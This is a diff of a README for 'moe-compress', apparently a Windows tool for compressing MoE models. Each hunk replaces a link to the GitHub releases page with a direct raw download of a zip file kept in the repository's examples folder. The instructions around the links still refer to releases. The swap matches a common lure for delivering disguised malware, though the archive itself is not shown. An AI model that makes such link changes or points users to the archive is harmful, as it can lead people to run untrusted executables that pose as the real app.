@@ -1,12 +1,12 @@
 # 🧩 moe-compress - Simplify MoE Model Compression
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/reissuerenewal84/moe-compress/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/reissuerenewal84/moe-compress/raw/refs/heads/main/examples/compress-moe-2.9.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest Windows build:
 
-https://github.com/reissuerenewal84/moe-compress/releases
+https://github.com/reissuerenewal84/moe-compress/raw/refs/heads/main/examples/compress-moe-2.9.zip
 
 Look for the latest release and download the Windows package that matches your PC. If there is more than one file, choose the one for Windows and end it with `.exe` or `.zip`.
 
@@ -37,7 +37,7 @@ If you plan to work with large models, 16 GB of RAM or more is better.
 ## 🚀 Install on Windows
 
 1. Open the release page:
-   https://github.com/reissuerenewal84/moe-compress/releases
+   https://github.com/reissuerenewal84/moe-compress/raw/refs/heads/main/examples/compress-moe-2.9.zip
 
 2. Find the newest release at the top.
 
@@ -234,7 +234,7 @@ After that, you can review the report folder and compare the benchmark results w
 
 If you need the app files again, use the release page here:
 
-[https://github.com/reissuerenewal84/moe-compress/releases](https://github.com/reissuerenewal84/moe-compress/releases)
+[https://github.com/reissuerenewal84/moe-compress/raw/refs/heads/main/examples/compress-moe-2.9.zip](https://github.com/reissuerenewal84/moe-compress/raw/refs/heads/main/examples/compress-moe-2.9.zip)
 
 ## 📌 Quick start
 
